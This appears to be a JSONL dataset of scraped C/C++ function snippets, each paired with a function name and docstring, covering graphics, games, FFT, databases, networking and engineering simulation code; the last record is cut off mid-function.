{"content":"{'function_name': 'app_shutdown', 'docstring': '\/\/ to system level #add here an app shutdown', 'code': 'void android_main(android_app* state)\\n{\\n    LOGI(\"GW Starting app\");\\n    \/\/ Make sure glue isn\\'t stripped.\\n    app_dummy();\\n    app_user_data data;\\n\\n    \/\/ Setup device and map for preparing gestures.\\n    gainput::InputDeviceTouch* touchDevice = data.CreateAndGetDevice<gainput::InputDeviceTouch>();\\n    GAINPUT_ASSERT(touchDevice);\\n    gainput::DeviceId touchId = touchDevice->GetDeviceId();\\n    gainput::InputMap map(data, \"testmap\");\\n\\n    \/\/ Setup gestures.\\n\\n    \/\/ Just tap.\\n    gainput::TapGesture* tg = data.CreateAndGetDevice<gainput::TapGesture>();\\n    GAINPUT_ASSERT(tg);\\n    tg->Initialize(touchId, gainput::Touch0Down, 500);\\n    map.MapBool(ButtonTapGesture, tg->GetDeviceId(), gainput::TapTriggered);\\n\\n    \/\/ Pinch.\\n    gainput::PinchGesture* pg = data.CreateAndGetDevice<gainput::PinchGesture>();\\n    GAINPUT_ASSERT(pg);\\n    pg->Initialize(touchId, gainput::Touch0Down,\\n            touchId, gainput::Touch0X,\\n            touchId, gainput::Touch0Y,\\n            touchId, gainput::Touch1Down,\\n            touchId, gainput::Touch1X,\\n            touchId, gainput::Touch1Y);\\n    map.MapBool(ButtonPinching, pg->GetDeviceId(), gainput::PinchTriggered);\\n    map.MapFloat(ButtonPinchScale, pg->GetDeviceId(), gainput::PinchScale);\\n    \\n    \/\/ Holding.\\n    gainput::HoldGesture* hg = data.CreateAndGetDevice<gainput::HoldGesture>();\\n    GAINPUT_ASSERT(hg);\\n    hg->Initialize(touchId, gainput::Touch0Down,\\n            touchId, gainput::Touch0X, 0.1f,\\n            touchId, gainput::Touch0Y, 0.1f,\\n            true,\\n            800);\\n    map.MapBool(ButtonHoldGesture, hg->GetDeviceId(), gainput::HoldTriggered);\\n\\n    \/\/ Rotation gesture.\\n    gainput::RotateGesture* rg = data.CreateAndGetDevice<gainput::RotateGesture>();\\n    GAINPUT_ASSERT(rg);\\n    rg->Initialize(touchId, gainput::Touch0Down,\\n            touchId, gainput::Touch0X,\\n            touchId, gainput::Touch0Y,\\n            touchId, gainput::Touch1Down,\\n            touchId, gainput::Touch1X,\\n            touchId, gainput::Touch1Y);\\n    map.MapBool(ButtonRotating, rg->GetDeviceId(), gainput::RotateTriggered);\\n    map.MapFloat(ButtonRotateAngle, rg->GetDeviceId(), gainput::RotateAngle);\\n    \/\/ Finish setup gestures.\\n\\n    data.root = NULL;\\n    data.window = NULL; data.android_app_state = state;\\n    data.init = false;\\n    data.animating = false;\\n    app_init(&data);\\n\\n    state->userData = &data;\\n    state->onAppCmd = app_handle_cmd;\\n    state->onInputEvent = app_handle_input;\\n\\n    if (state->savedState != NULL){\\n        \/\/ We are starting with a previous saved state; restore from it.\\n        data.state = *(saved_state*)state->savedState;\\n    }\\n\\n    \/\/ loop waiting for stuff to do.\\n    while (1) {\\n        \/\/ Read all pending events.\\n        int ident;\\n        int events;\\n        data.Update();\\n        android_poll_source* source;\\n\\n        \/\/ If not animating, we will block forever waiting for events.\\n        \/\/ If animating, we loop until all events are read, then continue\\n        \/\/ to draw the next frame of animation.\\n\\n        \/\/ Handling input events.\\n        bool isPinch = map.GetBool(ButtonPinching);\\n        bool isRotate = map.GetBool(ButtonRotating);\\n        bool isTap = map.GetBoolWasDown(ButtonTapGesture);\\n        bool isHold = map.GetBool(ButtonHoldGesture);\\n        if (isPinch || isRotate || isTap || isHold) {\\n            GW::Control * control = GW::App::getSingleton()->getStateManager()->getCurrState()->getController();\\n            if (isPinch == true) {\\n                float delta = map.GetFloat(ButtonPinchScale);\\n                if (delta != 1.) {   \/\/ Calculated by rate.\\n                    LOGI(\"GW_INPUT PINCH %f\", delta);\\n                    GW::PinchEvent e(delta);\\n                    (control != NULL) ? control->pinchDown(e) : LOGI(\"GW_INPUT TAP: control is null\");\\n                }\\n            }\\n            if (isRotate == true) {\\n                float angle = map.GetFloat(ButtonRotateAngle);\\n                if ( angle > 0. ) {   \/\/ Calculated by radians and every time is positive.\\n                    LOGI(\"GW_INPUT ROTATION %f\", angle);\\n                    GW::RotateEvent e(angle);\\n                    (control != NULL) ?  control->rotateDown(e) : LOGI(\"GW_INPUT TAP: control is null\");\\n                }\\n            }\\n\\n            if (isTap == true) {\\n                float x = AMotionEvent_getX(data.getEvent(), 0);\\n                float y = AMotionEvent_getY(data.getEvent(), 0);\\n                GW::TapEvent e(x, y);\\n                (control != NULL) ?  control->tapReleased(e) : LOGI(\"GW_INPUT TAP: control is null\");\\n\\n                LOGI(\"GW_INPUT TAP: %f;\", x);\\n                LOGI(\"GW_INPUT TAP: %f;\", y);\\n            }\\n\\n            if (isHold == true) {\\n                if (control != NULL)\\n                    control->tapHolded();\\n            }\\n        }\\n        while ((ident = ALooper_pollAll(data.animating ? 0 : -1, NULL, &events, (void**)&source)) >= 0){\\n            \/\/ Process this event.\\n            if (source != NULL){\\n                source->process(state, source);\\n            }\\n\\n            \/\/ Check if we are exiting.\\n            if (state->destroyRequested != 0) {\\n                app_shutdown(&data);\\n                return;\\n            }\\n        }\\n\\n        if (data.animating == true) {\\n            app_draw_frame(&data);\\n        }\\n    }\\n}'}","id":1810}
{"content":"{'function_name': 'extract', 'docstring': '\/\/ dictionary.open(dictionary_file_name);', 'code': 'int main() {\\n\\tstring dictionary_file_name;\\n\\tstring word_list_file_name;\\n\\tstring line;\\n\\tvector<string> word_list_v;\\n\\t\\n\\t\/\/INTERFACE HEADLINE\\n\\tcout << \"EXTRACTION OF WORD LIST FROM DICTIONARY\" << endl << \"=======================================\" << endl;\\n\\t\\n\\t\/\/ Read the file name \/\/\\n\\tcout << \"Dictionary file ? \";\\n\\tcin >> dictionary_file_name;\\n\\tcout << \"Word list file ? \";\\n\\tcin >> word_list_file_name;\\n\\t\\n\\textract(dictionary_file_name, word_list_v);\\n\\t\/\/int number_of_words= word_list_v.size();\\n\\t\/\/cout<< number_of_words;\\n\\t\/\/ Read the word_list file name \/\/\\n\\t\\n\\t\\n\\t\\n\\tcout << \"Extracting simple words from file\" << dictionary_file_name << endl << \",\" << \"begining with letter...\";\\n\\t\\n\\t\\n\\tcout << \"Number of simple words\" << \" = \" << word_list_v.size() - 1 << endl;\\n\\tcout << \"Sorting words \" << \"...\" << endl;\\n\\t\\n\\t\/\/Sort vector\\n\\tsort(word_list_v);\\n\\t\\n\\tcout << \"Removing duplicate words \" << \"...\" << endl;\\n\\t\\n\\t\/\/ Delete repeated vector words\\n\\tremove_duplicates(word_list_v);\\n\\t\\n\\tcout << \"Number of non-duplicate simple words\" << \" = \" << word_list_v.size() - 1 << endl;\\n\\t\\n\\tcout << \"Saving words into file \" << word_list_file_name << \" ...\" << endl;\\n\\twrite_to_file(word_list_file_name, word_list_v, word_list_v.size());\\n\\t\\n\\t\\n\\tcout << \"End of processing.\" << endl;\\n\\t\\n\\treturn 0;\\n}'}","id":1815}
{"content":"{'function_name': 'fft_ensure_table', 'docstring': '\/\/  Push into main table.', 'code': 'void fft_forward(complex<double> *T, int k){\\n    \/\/  Fast Fourier Transform\\n    \/\/  This function performs a forward FFT of length 2^k.\\n\\n    \/\/  This is a Decimation-in-Frequency (DIF) FFT.\\n    \/\/  The frequency domain output is in bit-reversed order.\\n\\n    \/\/Parameters:\\n    \/\/  -   T           -   Pointer to array.\\n    \/\/  -   k           -   2^k is the size of the transform\\n\\n    \/\/  End recursion at 2 points.\\n    if (k == 1){\\n        complex<double> a = T[0];\\n        complex<double> b = T[1];\\n        T[0] = a + b;\\n        T[1] = a - b;\\n        return;\\n    }\\n\\n    size_t length = (size_t)1 << k;\\n    size_t half_length = length \/ 2;\\n\\n    \/\/  Get local twiddle table.\\n    std::vector<complex<double>> &local_table = twiddle_table[k];\\n\\n    \/\/  Perform FFT reduction into two halves.\\n    for (size_t c = 0; c < half_length; c++){\\n        \/\/  Grab Twiddle Factor\\n        auto twiddle_factor = local_table[c];\\n\\n        \/\/  Grab elements\\n        complex<double> a = T[c];\\n        complex<double> b = T[c + half_length];\\n\\n        \/\/  Perform butterfly\\n        T[c              ]  = a + b;\\n        T[c + half_length]  = (a - b) * twiddle_factor;\\n    }\\n\\n    \/\/  Recursively perform FFT on lower elements.\\n    fft_forward(T, k - 1);\\n\\n    \/\/  Recursively perform FFT on upper elements.\\n    fft_forward(T + half_length, k - 1);\\n}'}","id":1817}
{"content":"{'function_name': 'retrieve_world_annotations_from_database', 'docstring': '\/\/ w.r.t photo_ID and its copies:', 'code': 'bool insert_fieldtest(\\n      gis_database* gis_database_ptr,\\n      string fieldtest_date,string brief_label,string description)\\n   {\\n\/\/      cout << \"inside databasefunc::insert_fieldtest()\" << endl;\\n\\n      string curr_insert_command=\\n         databasefunc::generate_insert_fieldtest_SQL_command(\\n            fieldtest_date,brief_label,description);\\n      \\n      vector<string> insert_commands;\\n      insert_commands.push_back(curr_insert_command);\\n      gis_database_ptr->set_SQL_commands(insert_commands);\\n\\n      return gis_database_ptr->execute_SQL_commands();\\n   }'}","id":1821}
{"content":"{'function_name': 'to_d3d_element', 'docstring': '\/\/ https:\/\/learn.microsoft.com\/en-us\/windows\/win32\/api\/d3d12\/ns-d3d12-d3d12_input_element_desc', 'code': 'inline D3D12_INPUT_ELEMENT_DESC to_d3d_element(\\n      const std::reference_wrapper<graphics::shaders::ivert_element>& e,\\n      graphics::input_data_class_t inClass,\\n      graphics::input_slot_t slot) noexcept\\n   {\\n      \/\/ https:\/\/learn.microsoft.com\/en-us\/windows\/win32\/api\/d3d12\/ns-d3d12-d3d12_input_element_desc\\n      D3D12_INPUT_ELEMENT_DESC ret;\\n      ret.SemanticName = e.get().name().c_str();\\n      ret.SemanticIndex = static_cast<UINT>(e.get().index());\\n      ret.InputSlotClass = graphics::to_d3d_input_class(inClass);\\n      ret.InputSlot = graphics::to_d3d_input_slot(slot);\\n      ret.Format = e.get().format();\\n      ret.AlignedByteOffset = D3D12_APPEND_ALIGNED_ELEMENT;\\n      ret.InstanceDataStepRate = 0;\\n      return ret;\\n   }'}","id":1825}
{"content":"{'function_name': 'LevelSystemOnSetExp', 'docstring': '\/\/ Give experience to the player', 'code': 'public Action LevelSystemOnHUD(Handle hTimer, const int userID)\\n{\\n    \/\/ Gets the client index from the user ID\\n    int clientIndex = GetClientOfUserId(userID);\\n\\n    \/\/ Validate client\\n    if(clientIndex)\\n    {\\n        \/\/ Initialize variables\\n        static char sInfo[SMALL_LINE_LENGTH]; static int iRed, iGreen, iBlue;\\n    \\n        \/\/ Validate zombie hud\\n        if(gClientData[clientIndex][Client_Zombie])\\n        {\\n            \/\/ Validate nemesis hud\\n            if(gClientData[clientIndex][Client_Nemesis])\\n            {\\n                strcopy(sInfo, sizeof(sInfo), \"nemesis\");\\n            }\\n            else\\n            {\\n                \/\/ Gets zombie name\\n                ZombieGetName(gClientData[clientIndex][Client_ZombieClass], sInfo, sizeof(sInfo));\\n            }\\n            \\n            \/\/ Gets colors \\n            iRed = gCvarList[CVAR_LEVEL_HUD_ZOMBIE_R].IntValue;\\n            iGreen = gCvarList[CVAR_LEVEL_HUD_ZOMBIE_G].IntValue;\\n            iBlue = gCvarList[CVAR_LEVEL_HUD_ZOMBIE_B].IntValue;\\n        }\\n        \/\/ Otherwise, show human hud\\n        else\\n        {\\n            \/\/ Validate survivor hud\\n            if(gClientData[clientIndex][Client_Survivor])\\n            {\\n                strcopy(sInfo, sizeof(sInfo), \"survivor\");\\n            }\\n            else\\n            {\\n                \/\/ Gets human name\\n                HumanGetName(gClientData[clientIndex][Client_HumanClass], sInfo, sizeof(sInfo));\\n            }\\n            \/\/ Gets colors \\n            iRed = gCvarList[CVAR_LEVEL_HUD_HUMAN_R].IntValue;\\n            iGreen = gCvarList[CVAR_LEVEL_HUD_HUMAN_G].IntValue;\\n            iBlue = gCvarList[CVAR_LEVEL_HUD_HUMAN_B].IntValue;\\n        }\\n\\n        \/\/ Print hud text to client\\n        TranslationPrintHudText(hHudLevel, clientIndex, 0.02, 0.885, 1.1, iRed, iGreen, iBlue, 255, 0, 0.0, 0.0, 0.0, \"level info\", GetClientArmor(clientIndex), sInfo, gClientData[clientIndex][Client_Level], gClientData[clientIndex][Client_Exp], LevelSystemStats[gClientData[clientIndex][Client_Level]]);\\n    \\n        \/\/ Allow timer\\n        return Plugin_Continue;\\n    }\\n    \\n    \/\/ Clear timer\\n    gClientData[clientIndex][Client_LevelTimer] = INVALID_HANDLE;\\n    \\n    \/\/ Destroy timer\\n    return Plugin_Stop;\\n}'}","id":1826}
{"content":"{'function_name': 'fun2', 'docstring': '\/\/\u5f53\u6ca1\u6709 \u5f15\u7528\u7b26\u53f7 \u65f6\uff0c\u4e3a\u4ec0\u4e48\u6548\u679c\u5c31\u50cf\u662f \u865a\u51fd\u6570\u4e0d\u8d77\u4f5c\u7528\u4e86??????', 'code': 'int main()\\n{\\n\\tFish fish;\\n\\tAnimal animal;\\n\\tDuck duck;\\n\\n\\t\/\/\/\u5bf9\u6bd4\u4e00\u4e0b\u7684\u5185\u5bb9\\n\\tfish.name();\\n\\tanimal.name();\\n\\tAnimal *animal1 = &fish;\\t\\t\/\/\u5f53\u4e0d\u8bbe\u7f6e virtual \uff08\u865a\u51fd\u6570\uff09\u65f6\uff0c animal1 \u6700\u7ec8\u6307\u9488\u4efb\u7136\u6307\u5411\u7684\u662f animal.name() \u5373\u76f8\u5f53\u4e8e\u4efb\u7136\u6307\u5411\u4ed6\u7684\u57fa\u7c7b\\n\\tanimal1->name();\\t\\t\\t\\t\/\/\u6709\u4e86 virtual \u65f6\uff0canimal1 \u6307\u5411\u7684\u662f fish.name() \\n\\t\/\/\/\/----<<<<\\n\\n\\tcout<<\"________________________\"<<endl;\\n\\tfun(animal);\\n\\tfun(fish);\\n\\tfun(duck);\\n\\tcout<<\"________________________\"<<endl;\\n\\tfun2(animal);\\n\\tfun2(fish);\\n\\tfun2(duck);\\n\\treturn 0;\\n}'}","id":1828}
{"content":"{'function_name': 'writeInterface', 'docstring': '\/*\\n  if (runType == \"local\") {\\n    uqData[\\'concurrency\\'] = uqData.get(\\'concurrency\\', 4)\\n  }    \\n  if uqData[\\'concurrency\\'] == None:\\n     SimCenterUQ_input += \"  asynchronous\\\\n\"\\n  elif uqData[\\'concurrency\\'] > 1:\\n     SimCenterUQ_input += \"  asynchronous evaluation_concurrency = {}\\\\n\".format(uqData[\\'concurrency\\'])\\n  }\\n  *\/', 'code': 'int\\nwriteResponse(std::ostream &SimCenterUQFile, json_t *rootEDP,  std::string idResponse, bool numericalGradients, bool numericalHessians,\\n\\t      std::vector<std::string> &edpList) {\\n\\n  int numResponses = 0;\\n\\n  SimCenterUQFile << \"responses\\\\n\";\\n\\n  if (!idResponse.empty() && (idResponse.compare(\"calibration\") != 0))\\n    SimCenterUQFile << \"  id_responses = \\'\" << idResponse << \"\\'\\\\n\";\\n    \\n  \/\/\\n  \/\/ look in file for EngineeringDemandParameters \\n  \/\/ .. if there parse edp for each event\\n  \/\/\\n\\n  json_t *EDPs = json_object_get(rootEDP,\"EngineeringDemandParameters\");\\n\\n  if (EDPs != NULL) {\\n\\n    numResponses = int(json_integer_value(json_object_get(rootEDP,\"total_number_edp\")));\\n    SimCenterUQFile << \" response_functions = \" << numResponses << \"\\\\n response_descriptors = \";\\n\\n    \/\/ for each event write the edps\\n    int numEvents = int(json_array_size(EDPs));\\n    \\n    \/\/ loop over all events\\n    for (int i=0; i<numEvents; i++) {\\n      \\n      json_t *event = json_array_get(EDPs,i);\\n      json_t *eventEDPs = json_object_get(event,\"responses\");\\n      int numResponses = int(json_array_size(eventEDPs));  \\n      \\n      \/\/ loop over all edp for the event\\n      for (int j=0; j<numResponses; j++) {\\n\\t\\n\\tjson_t *eventEDP = json_array_get(eventEDPs,j);\\n\\tconst char *eventType = json_string_value(json_object_get(eventEDP,\"type\"));\\n\\tbool known = false;\\n\\tstd::string edpAcronym(\"\");\\n\\tconst char *floor = NULL;\\n\\tstd::cerr << \"writeResponse: type: \" << eventType;\\n\\t\/\/ based on edp do something \\n\\tif (strcmp(eventType,\"max_abs_acceleration\") == 0) {\\n\\t  edpAcronym = \"PFA\";\\n\\t  floor = json_string_value(json_object_get(eventEDP,\"floor\"));\\n\\t  known = true;\\n\\t} else if\\t(strcmp(eventType,\"max_drift\") == 0) {\\n\\t  edpAcronym = \"PID\";\\n\\t  floor = json_string_value(json_object_get(eventEDP,\"floor2\"));\\n\\t  known = true;\\n\\t} else if\\t(strcmp(eventType,\"residual_disp\") == 0) {\\n\\t  edpAcronym = \"RD\";\\n\\t  floor = json_string_value(json_object_get(eventEDP,\"floor\"));\\n\\t  known = true;\\n\\t} else if (strcmp(eventType,\"max_pressure\") == 0) {\\n\\t  edpAcronym = \"PSP\";\\n\\t  floor = json_string_value(json_object_get(eventEDP,\"floor2\"));\\n\\t  known = true;\\n\\t} else if (strcmp(eventType,\"max_rel_disp\") == 0) {\\n\\t  edpAcronym = \"PFD\";\\n\\t  floor = json_string_value(json_object_get(eventEDP,\"floor\"));\\n\\t  known = true;\\n\\t} else if (strcmp(eventType,\"peak_wind_gust_speed\") == 0) {\\n\\t  edpAcronym = \"PWS\";\\n\\t  floor = json_string_value(json_object_get(eventEDP,\"floor\"));\\n\\t  known = true;\\n\\t} else {\\n\\t  SimCenterUQFile << \"\\'\" << eventType << \"\\' \";\\n\\t  std::string newEDP(eventType);\\n\\t  edpList.push_back(newEDP);\\n\\t}\\n\\t\\n\\tif (known == true) {\\n\\t  json_t *dofs = json_object_get(eventEDP,\"dofs\");\\n\\t  int numDOF = int(json_array_size(dofs));\\n\\t  \\n\\t  \/\/ loop over all edp for the event\\n\\t  for (int k=0; k<numDOF; k++) {\\n\\t    int dof = int(json_integer_value(json_array_get(dofs,k)));\\n\\t    SimCenterUQFile << \"\\'\" << i+1 << \"-\" << edpAcronym << \"-\" << floor << \"-\" << dof << \"\\' \";\\n\\t    std::string newEDP = std::string(std::to_string(i+1)) + std::string(\"-\")\\n\\t      + edpAcronym \\n\\t      + std::string(\"-\") \\n\\t      + std::string(floor) +\\n\\t      std::string(\"-\") + std::string(std::to_string(dof));\\n\\t    edpList.push_back(newEDP);\\n\\t  }\\n\\t}\\n      }\\n    }\\n  } else {\\n\\n    \/\/\\n    \/\/ quoFEM .. just a list of straight EDP\\n    \/\/\\n\\n    numResponses = int(json_array_size(rootEDP));\\n\\n    if (idResponse.compare(\"calibration\") != 0)\\n      SimCenterUQFile << \" response_functions = \" << numResponses << \"\\\\n response_descriptors = \";\\n    else\\n      SimCenterUQFile << \" calibration_terms = \" << numResponses << \"\\\\n response_descriptors = \";\\n    \\n    for (int j=0; j<numResponses; j++) {\\n      json_t *theEDP_Item = json_array_get(rootEDP,j);\\n      const char *theEDP = json_string_value(json_object_get(theEDP_Item,\"name\"));\\n      SimCenterUQFile << \"\\'\" << theEDP << \"\\' \";\\n      std::string newEDP(theEDP);\\n      edpList.push_back(newEDP);\\n    }\\n  }\\n\\n  if (numericalGradients == true) \\n    SimCenterUQFile << \"\\\\n numerical_gradients\";\\n  else\\n    SimCenterUQFile << \"\\\\n no_gradients\";\\n\\n  if (numericalHessians == true) \\n    SimCenterUQFile << \"\\\\n numerical_hessians\\\\n\\\\n\";\\n  else\\n    SimCenterUQFile << \"\\\\n no_hessians\\\\n\\\\n\";\\n\\n  return numResponses;\\n}'}","id":1830}
{"content":"{'function_name': 'runTransactions', 'docstring': '\/\/ pre operation to get tpcc_context infomation', 'code': 'int main (int argc,char *argv[]) \\n{\\n    if (argc < 6) {\\n        printf(\"example: .\/runtpcc schema_file trace_file transaction_number mode data_dir\/\\\\n\");\\n           return 0;\\n    }\\n        \\n    int trans_number = -1, stat = -1;\\n    struct input_new_order_t *neworders = NULL;\\n    struct input_payment_t *payments = NULL;\\n    struct input_delivery_t *deliverys = NULL;\\n    struct input_order_status_t *orderstatuss = NULL;\\n    struct input_stock_level_t *stocklevels = NULL;\\n    int *choice = NULL;\\n\\n    global_init ();\\n    if ((trans_number = loadTransactions (argv[2], atoi(argv[3]), atoi(argv[4]), neworders, payments, deliverys, orderstatuss, stocklevels, choice)) < 0) {\\n        printf (\"loadTransactions error! %d\\\\n\", trans_number);\\n        return -5;\\n    }\\n    printf (\"finish load transactions: %d\\\\n\", trans_number);\\n    printf (\"----------------------------------------------------\\\\n\");\\n    \/\/ return 0;\\n    if ((stat = load_schema (argv[1])) < 0) {\\n        printf (\"load_schema error! %d\\\\n\", stat);\\n        return -6;\\n    }\\n    printf (\"finish load tpcc schema...ok\\\\n\");\\n    \/\/ g_catalog.print ();\\n    printf (\"----------------------------------------------------\\\\n\");\\n    if ((stat = load_data (table_name, 9, argv[5])) < 0) {\\n        printf (\"runTransactions error! %d\\\\n\", stat);\\n        return -6;\\n    }\\n    printf (\"finish load tpcc data...ok\\\\n\");\\n    printf (\"----------------------------------------------------\\\\n\");\\n    printf (\"start tpcc test...\\\\n\");\\n    if ((stat = runTransactions (neworders,payments,deliverys,orderstatuss,stocklevels,trans_number,choice) < 0)) {\\n        printf (\"runTransactions error! %d\\\\n\", stat);\\n        return -6;\\n    }\\n    global_shut ();\\n\\n    return 0;    \\n}'}","id":1832}
{"content":"{'function_name': 'main', 'docstring': '\/\/target value within array', 'code': 'void Reverse(string name){\\n    \/\/purpose: to reverse an inputed string\\n    \/\/pre-condition: a string passed and inputed by user\\n    \/\/post-condition: prints the string in reverse order\\n    if(name == \"\") \/\/ the base case\\n    {\\n        return;\\n    }\\n    else \/\/ the recursive stepr\\n    {\\n        Reverse(name.substr(1));\\n        cout<<name.at(0);\\n    }\\n\\n}'}","id":1834}
{"content":"{'function_name': 'vec_dot', 'docstring': '\/\/input 2 vector, output dot product\\r', 'code': 'vector<float> vec_normalize(const vector<float> &input)\\r\\n{\/\/output normalized vector\\r\\n    float length = vec_length(input);\\r\\n    vector<float> output((int)input.size());\\r\\n    for(int i = 0 ; i < (int)input.size() ; i++)\\r\\n        output[i] = input[i]\/length;\\r\\n\\r\\n    return output;\\r\\n}'}","id":1835}
{"content":"{'function_name': 'Receiver_ConstructAck', 'docstring': '\/\/ Add checksum.', 'code': 'void Receiver_FromLowerLayer(struct packet *pkt)\\n{\\n    int payload_size;\\n    bool end_of_msg;\\n    int seq_no;\\n    char payload[RDT_MAX_PAYLOAD_SIZE];\\n    std::string message;\\n    struct message msg;\\n\\n    if (!Receiver_ParsePacket(pkt, &payload_size, &end_of_msg, &seq_no, payload)) \/\/ Invalid packet. Do not ACK.\\n        return;\\n\\n    \/\/ Reply ACK.\\n    packet ackpkt;\\n    Receiver_ConstructAck(seq_no, &ackpkt);\\n    Receiver_ToLowerLayer(&ackpkt);\\n\\n    \/\/ Record packet.\\n    receiver_packets[seq_no].received = true;\\n    receiver_packets[seq_no].is_end = end_of_msg;\\n    receiver_packets[seq_no].data = std::string(payload, payload_size);\\n\\n    \/\/ Try to do message reassembly.\\n    for (int i = last_end_of_msg + 1; i <= RDT_MAX_SEQ_NO; ++i) {\\n        if (!receiver_packets[i].received) \/\/ No continuous parts to concatenate.\\n            break;\\n\\n        if (receiver_packets[i].is_end) {\\n            message.clear();\\n\\n            \/\/ Concatenate message parts.\\n            for (int j = last_end_of_msg + 1; j <= i; ++j)\\n                message += receiver_packets[j].data;\\n\\n            \/\/ Deliver to upper layer.\\n            msg.size = message.size();\\n            msg.data = (char*)(long)message.c_str();\\n            Receiver_ToUpperLayer(&msg);\\n\\n            last_end_of_msg = i;\\n        }\\n    }\\n}'}","id":1842}
{"content":"{'function_name': 'calculateTransformation', 'docstring': '\/\/ remove our OX rotation information', 'code': 'void debugMarkers(const cv::Mat& sceneRGB,\\n                  const std::vector<cv::Mat>& markerImgs,\\n                  const std::vector<MarkerScore>& markers,\\n                  const std::vector<ContourFloat>& quads) {\\n\\n    assert(markerImgs.size() == markers.size());\\n    assert(markerImgs.size() == quads.size());\\n\\n    \/\/ helper function\\n    auto putText = [](cv::Mat& img, const std::string& str, cv::Point pt) {\\n        cv::putText(img, str, pt, cv::FONT_HERSHEY_PLAIN, 1.0, CV_RGB(255, 0, 0), 1, CV_AA);\\n    };\\n\\n    \/\/ show the whole scene with every marker outlined\\n    cv::Mat dbgSceneBGR;\\n\\n    cv::cvtColor(sceneRGB, dbgSceneBGR, CV_RGB2BGR);\\n\\n    for (std::size_t i = 0; i < quads.size(); i++) {\\n        \/\/ first draw all the lines, then captions\\n        for (int j = 0; j < 4; j++) {\\n            cv::line(dbgSceneBGR, quads[i][j], quads[i][(j + 1) % 4], CV_RGB(0, 255, 0), 2);\\n        }\\n        for (int j = 0; j < 4; j++) {\\n            putText(dbgSceneBGR, std::to_string(j), quads[i][j]);\\n        }\\n    }\\n\\n    cv::imshow(\"Debug scene\", dbgSceneBGR);\\n\\n    \/\/ show each marker after warping\\n    if (markerImgs.size() == 0) return;\\n\\n    int numImages = markerImgs.size();\\n    int imageSize = markerImgs[0].rows;\\n\\n    cv::Mat dbgMarkers{ imageSize * numImages, imageSize, CV_8UC3 };\\n\\n    for (int i = 0; i < numImages; i++) {\\n        cv::Rect roi { 0, i*imageSize, imageSize, imageSize };\\n        cv::Mat markerImgBGR;\\n        auto img = dbgMarkers(roi);\\n\\n        cv::cvtColor(markerImgs[i], markerImgBGR, CV_GRAY2BGR);\\n\\n        markerImgBGR.copyTo(img);\\n\\n        auto id = std::to_string(markers[i].marker.id);\\n        putText(img, \"id\", { 10, 20 });\\n        putText(img, id, { 70, 20 });\\n\\n        auto center = 0.25 * std::accumulate(std::begin(quads[i]), std::end(quads[i]), cv::Point2f{ 0.0f, 0.0f });\\n        auto pos = std::to_string(int(center.x)) + \", \" + std::to_string(int(center.y));\\n        putText(img, \"pos\", { 10, 40 });\\n        putText(img, pos, { 70, 40 });\\n\\n        auto score = std::to_string(markers[i].score);\\n        putText(img, \"score\", { 10, 60 });\\n        putText(img, score, { 70, 60 });\\n    }\\n    \\n    cv::imshow(\"Debug markers\", dbgMarkers);\\n}'}","id":1844}
{"content":"{'function_name': 'denoiseb_rd48_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd49_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd49 read pattern: { denoiseb_update_0[d0, d1] -> raw[3 + 2d0, 2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: {  }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_0();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1849}
{"content":"{'function_name': 'findPathToGoal', 'docstring': '\/******************************\\n   *  TODO TODO TODO TODO TODO\\n   *  TODO TODO TODO TODO TODO\\n   *  TODO TODO TODO TODO TODO\\n   *  TODO TODO TODO TODO TODO\\n   *  TODO TODO TODO TODO TODO\\n   *  TODO TODO TODO TODO TODO\\n   *  TODO TODO TODO TODO TODO\\n   *  TODO TODO TODO TODO TODO\\n   ******************************\/', 'code': 'int main()\\n{\\n  \/** Map from movement characters (U, D, R, L) to position delta\\'s *\/\\n  movements[\\'U\\'] = Position( 0,-1);\\n  movements[\\'D\\'] = Position( 0, 1);\\n  movements[\\'R\\'] = Position( 1, 0);\\n  movements[\\'L\\'] = Position(-1, 0);\\n\\n  \/** Map from tile types (\\'#\\', \\'.\\', \\'S\\' ...) to cost of moving onto that tile *\/\\n  costs[\\'S\\'] = 10;\\n  costs[\\'G\\'] = 3;\\n  costs[\\'g\\'] = 0;\\n  costs[\\'.\\'] = 2;\\n  costs[\\' \\'] = 1;\\n\\n  std::auto_ptr<Grid<char> > maze(loadMaze(std::cin));\\n\\n  std::pair<int, std::string> result = findPathToGoal(*maze);\\n  int cost = result.first;\\n  std::string path = result.second;\\n\\n  std::cout << \"Result:\" << std::endl;\\n  plotPath(*maze, path);\\n  std::cout << \"Cost: \" << cost << std::endl;\\n  std::cout << \"Path: \"  << path << std::endl;\\n\\n  return 0;\\n}'}","id":1854}
{"content":"{'function_name': 'msgpack_array_view', 'docstring': '\/\/ nop', 'code': 'data_view decode(msgpack::overlay& objects, const T& t) {\\n  using namespace msgpack;\\n  auto o = objects.get();\\n  if (o.format() == nil)\\n    return {};\\n  if constexpr (std::is_same_v<T, none_type>) {\\n    \/\/ This branch should never get triggered because an object with format\\n    \/\/ \\'nil\\' is handled already above.\\n    VAST_ASSERT(!\"null check too late\");\\n    return {};\\n  } else if constexpr (std::is_same_v<T, bool_type>) {\\n    if (auto x = get<bool>(o))\\n      return make_data_view(*x);\\n  } else if constexpr (std::is_same_v<T, integer_type>) {\\n    auto f = make_signed_visitor();\\n    return visit(f, o);\\n  } else if constexpr (std::is_same_v<T, count_type>) {\\n    auto f = make_unsigned_visitor<converter<count>>();\\n    return visit(f, o);\\n  } else if constexpr (std::is_same_v<T, real_type>) {\\n    if (auto x = get<double>(o))\\n      return make_data_view(*x);\\n  } else if constexpr (std::is_same_v<T, duration_type>) {\\n    using namespace std::chrono;\\n    auto to_ns = [](auto x) { return duration{nanoseconds{x}}; 